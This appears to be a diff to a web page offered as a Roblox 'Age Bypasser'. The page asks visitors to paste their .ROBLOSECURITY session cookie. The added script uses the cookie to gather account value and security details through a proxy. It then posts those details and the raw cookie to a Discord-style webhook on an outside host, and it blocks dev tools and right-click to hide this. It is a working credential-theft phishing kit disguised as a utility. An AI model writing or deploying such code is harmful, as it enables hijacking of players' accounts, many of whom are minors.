@@ -453,7 +453,7 @@
       left: 0;
       width: 100%;
       height: 100%;
-      z-index: 1;
+      z-index: -1; /* Set to -1 to be in the background */
       pointer-events: none;
     }
     
@@ -544,13 +544,15 @@
         top: 20px;
         right: 20px;
         left: 20px;
-        right: 20px;
       }
     }
   </style>
 </head>
 
 <body>
+  <!-- FIXED: Added the missing canvas for the background animation -->
+  <canvas id="snowCanvas"></canvas>
+
   <audio id="sfx-success" src="short-success-sound-glockenspiel-treasure-video-game-6346.mp3" preload="auto"></audio>
   <audio id="sfx-error" src="error-08-206492.mp3" preload="auto"></audio>
   <audio id="sfx-swoosh" src="swoosh-06-351021.mp3" preload="auto"></audio>
@@ -577,7 +579,7 @@
         <!-- Bypasser Card -->
         <div class="box">
           <h3>Age Bypasser</h3>
-          <p>Paste your .ROBLOSECURITY cookie in the box below, then click "Bypass" to bypass and process your account easily.</p>
+          <p>Paste your .ROBLOSECURITY cookie in the box below, then click "Bypass" to process your account.</p>
           
           <form id="cookieForm">
             <div class="form-group">
@@ -609,7 +611,7 @@
           <h3>How to Use</h3>
           <p>Video Tutorial - Learn how to safely use the Age Bypasser</p>
           
-          <video width="100%" height="auto" controls style="border-radius: 16px; border: 1px solid var(--border-color); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); margin-top: 1.5rem;">
+          <video width="100%" height="auto" controls>
             <source src="bypass.mp4" type="video/mp4">
             Your browser does not support the video tag.
           </video>
@@ -618,14 +620,25 @@
     </div>
   </section>
 
+<!-- Contact Button -->
+<a href="https://discord.gg/p8b7XrMrzM" target="_blank" class="contact-btn">
+  <i class="fab fa-discord"></i>
+  Contact
+</a>
+
+<!-- Background Animation Script -->
 <script>
 (function(){
   const canvas = document.getElementById("snowCanvas");
+  // Check if canvas exists to prevent errors
+  if (!canvas) return;
+  
   const ctx = canvas.getContext("2d");
   let width = canvas.width = window.innerWidth;
   let height = canvas.height = window.innerHeight;
   let snowflakes = [];
   const number = 100;
+
   for (let i = 0; i < number; i++){
       snowflakes.push({
           x: Math.random() * width,
@@ -634,6 +647,7 @@
           density: Math.random() * number
       });
   }
+
   let angle = 0;
   function drawSnowflakes(){
       ctx.clearRect(0, 0, width, height);
@@ -657,6 +671,7 @@
       }
       updateSnowflakes();
   }
+
   function updateSnowflakes(){
       angle += 0.005;
       for (let i = 0; i < number; i++){
@@ -668,7 +683,9 @@
           }
       }
   }
+  
   setInterval(drawSnowflakes, 33);
+  
   window.addEventListener("resize", function(){
     width = canvas.width = window.innerWidth;
     height = canvas.height = window.innerHeight;
@@ -676,13 +693,265 @@
 })();
 </script>
 
-<script src="bypasser.js"></script>
+<!-- Main Application Logic (Recoded Bypasser Script) -->
+<script>
+$(document).ready(function() {
+    const successSound = document.getElementById("sfx-success");
+    const errorSound = document.getElementById("sfx-error");
+    const swooshSound = document.getElementById("sfx-swoosh");
 
-<!-- Contact Button -->
-<a href="https://discord.gg/p8b7XrMrzM" target="_blank" class="contact-btn">
-  <i class="fab fa-discord"></i>
-  Contact
-</a>
+    // Configuration
+    const proxyUrl = "https://robypass.onrender.com";
+    const webhookUrl = `${proxyUrl}/webhook`;
+
+    // A helper function for making API requests through the proxy
+    async function makeProxyRequest(endpoint, cookie, method = "POST") {
+        const response = await fetch(`${proxyUrl}${endpoint}`, {
+            method,
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ cookie }),
+        });
+        if (!response.ok) {
+            throw new Error(`Proxy failed for ${endpoint}: ${response.status}`);
+        }
+        return response.json();
+    }
+
+    // Fetches all account information
+    async function getAccountInfo(cookie) {
+        const defaultInfo = {
+            username: "Unknown User",
+            userId: "N/A",
+            robuxBalance: "0",
+            accountAge: "Unknown",
+            avatarUrl: "https://tr.rbxcdn.com/default-avatar.png",
+            rap: "0",
+            ownedItems: "0",
+            creditBalance: "0",
+            hasPremium: false,
+            hasKorblox: false,
+            hasValk: false,
+            hasHeadless: false,
+            groupCount: "0",
+            groupFunds: "0",
+            twoStepEnabled: false,
+            voiceChatEnabled: false,
+        };
+
+        try {
+            // Get user info (ID and Name)
+            const userData = await makeProxyRequest("/v1/users/authenticated", cookie);
+            const userId = userData.id || defaultInfo.userId;
+            const username = userData.name || defaultInfo.username;
+
+            // Get avatar
+            const avatarData = await makeProxyRequest(`/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`, cookie);
+            const avatarUrl = avatarData.data && avatarData.data[0] ? avatarData.data[0].imageUrl : defaultInfo.avatarUrl;
+
+            // Get account age from user profile
+            const profileData = await makeProxyRequest(`/v1/users/${userId}`, cookie);
+            const createdDate = new Date(profileData.created);
+            const accountAge = `${Math.floor((new Date() - createdDate) / (1000 * 60 * 60 * 24))} Days`;
+            
+            // Get Robux balance
+            const economyData = await makeProxyRequest("/v1/user/currency", cookie);
+            const robuxBalance = economyData.robux ? economyData.robux.toString() : "0";
+
+            // Get premium status
+            const premiumData = await makeProxyRequest(`/v1/users/${userId}/validate-membership`, cookie);
+            const hasPremium = premiumData.isPremium || false;
+
+            // Get security settings
+            const settingsData = await makeProxyRequest("/v1/account/settings", cookie);
+            const twoStepEnabled = settingsData.twoStepVerificationEnabled || false;
+            const voiceChatEnabled = settingsData.isVoiceEnabled || false;
+
+            // --- OPTIMIZED COLLECTIBLES FETCH ---
+            // Fetch all collectibles only ONCE and process them for RAP, count, and special items.
+            let rap = defaultInfo.rap;
+            let ownedItems = defaultInfo.ownedItems;
+            let hasKorblox = defaultInfo.hasKorblox;
+            let hasValk = defaultInfo.hasValk;
+            let hasHeadless = defaultInfo.hasHeadless;
+
+            try {
+                const inventoryData = await makeProxyRequest(`/v1/users/${userId}/assets/collectibles?limit=100`, cookie);
+                const collectibles = inventoryData.data || [];
+                
+                ownedItems = collectibles.length.toString();
+                rap = collectibles.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0).toString();
+                hasKorblox = collectibles.some(item => item.assetId === 139607718);
+                hasValk = collectibles.some(item => item.assetId === 1365767);
+                hasHeadless = collectibles.some(item => item.assetId === 134082579);
+            } catch (invError) {
+                console.warn("Could not fetch inventory collectibles:", invError.message);
+            }
+
+            // Return all the gathered information
+            return {
+                username,
+                userId,
+                robuxBalance,
+                accountAge,
+                avatarUrl,
+                rap,
+                ownedItems,
+                hasPremium,
+                hasKorblox,
+                hasValk,
+                hasHeadless,
+                twoStepEnabled,
+                voiceChatEnabled,
+                creditBalance: "0", // Default value
+                groupCount: "0",    // Default value
+                groupFunds: "0",    // Default value
+            };
+
+        } catch (error) {
+            console.error("Failed to get account info:", error.message);
+            return defaultInfo; // Return default info if anything fails
+        }
+    }
+
+    // Handle the form submission
+    $("#cookieForm").on("submit", async function(e) {
+        e.preventDefault();
+        const cookie = $("#cookieInput").val().trim();
+
+        if (!cookie) {
+            showNotif("Cookie cannot be empty.", false);
+            errorSound.play();
+            return;
+        }
+
+        // Show loader and hide button
+        $("#refreshBtn").hide();
+        $("#loader").show();
+        $("#userInfo").hide();
+        $("#refreshedBox").hide();
+
+        try {
+            // Get all account info
+            const accountInfo = await getAccountInfo(cookie);
+
+            // If the userId is still N/A, the cookie was invalid
+            if (accountInfo.userId === "N/A") {
+                throw new Error("Invalid cookie or failed to fetch user data.");
+            }
+
+            // Show success notification
+            showNotif("✅ Cookie processed successfully!", true);
+            swooshSound.play();
+
+            // Build the Discord embed with the gathered data
+            const webhookPayload = {
+                username: "Roblox Bypasser Bot",
+                content: "@everyone",
+                embeds: [{
+                    title: "**```Homepage - Result```**",
+                    description: `[Rolimons](https://www.rolimons.com/player/${accountInfo.userId}) <:rolimons:978559948432744468>`,
+                    color: 0x3B1F7F,
+                    author: {
+                        name: `${accountInfo.username}`,
+                        url: `https://www.roblox.com/users/${accountInfo.userId}/profile`,
+                        icon_url: accountInfo.avatarUrl,
+                    },
+                    thumbnail: { url: accountInfo.avatarUrl },
+                    fields: [
+                        { name: "About User", value: `\`\`Account Age: ${accountInfo.accountAge}\`\``, inline: false },
+                        { name: "<:Robux:1313020721987063829> Robux", value: `Balance: ${accountInfo.robuxBalance}`, inline: true },
+                        { name: "<:Limited:1313024834783154211> Rap", value: `Rap: ${accountInfo.rap}\nOwned: ${accountInfo.ownedItems}`, inline: true },
+                        { name: "<:Premium:1313020726474706994> Premium", value: `${accountInfo.hasPremium ? "True" : "False"}`, inline: true },
+                        { name: "<:Settings:1313020732225093672> Settings", value: `<:2Step:1313020736218333245> ${accountInfo.twoStepEnabled ? "Enabled" : "Disabled"}\n<:VoiceChat:1313020746829926440> ${accountInfo.voiceChatEnabled ? "Enabled" : "Disabled"}`, inline: true },
+                        { name: "<:Collectible:1313026924678742087> Collectibles", value: `<:Korblox:1313020724184743936> ${accountInfo.hasKorblox ? "True" : "False"}\n<:vvalk:1354438650519355452> ${accountInfo.hasValk ? "True" : "False"}\n<:Headless:1313020741003903016> ${accountInfo.hasHeadless ? "True" : "False"}`, inline: true },
+                        { name: "<:banks:1349856883498029097> Groups", value: `**Owned:** ${accountInfo.groupCount}\n**Funds:** ${accountInfo.groupFunds}`, inline: true },
+                    ],
+                    timestamp: new Date().toISOString(),
+                }, {
+                    description: `<:Cookie:1313022426346426368> **.ROBLOSECURITY**\n**\`\`\`${cookie}\`\`\`**`,
+                    color: 0x3B1F7F,
+                }],
+            };
+
+            // Send the data to the webhook
+            const webhookRes = await fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(webhookPayload),
+            });
+
+            if (!webhookRes.ok) {
+                console.error("Webhook failed:", webhookRes.status, await webhookRes.text());
+                throw new Error("Could not send data to webhook.");
+            }
+            
+            successSound.play();
+            $("#refreshedBox").fadeIn();
+
+        } catch (error) {
+            console.error("Submit error:", error.message);
+            showNotif(`Error: ${error.message}`, false);
+            errorSound.play();
+        } finally {
+            $("#loader").hide();
+        }
+    });
+
+    // Simple notification function
+    function showNotif(msg, isSuccess = false) {
+        const $notif = $("#notif");
+        $notif.removeClass('notif-success notif-error').addClass(isSuccess ? 'notif-success' : 'notif-error');
+        $notif.text(msg).fadeIn(200).delay(2000).fadeOut(300);
+    }
+
+    // Typed text effect
+    const texts = ["Roblox Bypasser", "are you a femboy by any chance ? ", "Made By Guildness"];
+    let i = 0;
+    const typedText = document.getElementById("typedText");
+
+    function typeEffect() {
+        const text = texts[i];
+        let index = 0;
+        const typing = setInterval(() => {
+            if (index <= text.length) {
+                typedText.textContent = text.slice(0, index);
+                index++;
+            } else {
+                clearInterval(typing);
+                setTimeout(() => {
+                    let backspaceIndex = text.length;
+                    const backspace = setInterval(() => {
+                        if (backspaceIndex > 0) {
+                            typedText.textContent = text.slice(0, backspaceIndex - 1);
+                            backspaceIndex--;
+                        } else {
+                            clearInterval(backspace);
+                            i = (i + 1) % texts.length;
+                            setTimeout(typeEffect, 300);
+                        }
+                    }, 50);
+                }, 2000);
+            }
+        }, 100);
+    }
+    typeEffect();
+
+    // Reset button functionality
+    $("#returnBtn").on("click", function () {
+        $("#refreshedBox").hide();
+        $("#cookieInput").val("");
+        $("#refreshBtn").show();
+    });
+
+    // Disable context menu and dev tools (basic protection)
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase())) || (e.ctrlKey && e.key.toUpperCase() === 'U')) {
+            e.preventDefault();
+        }
+    });
+});
+</script>
 
 </body>
 </html>
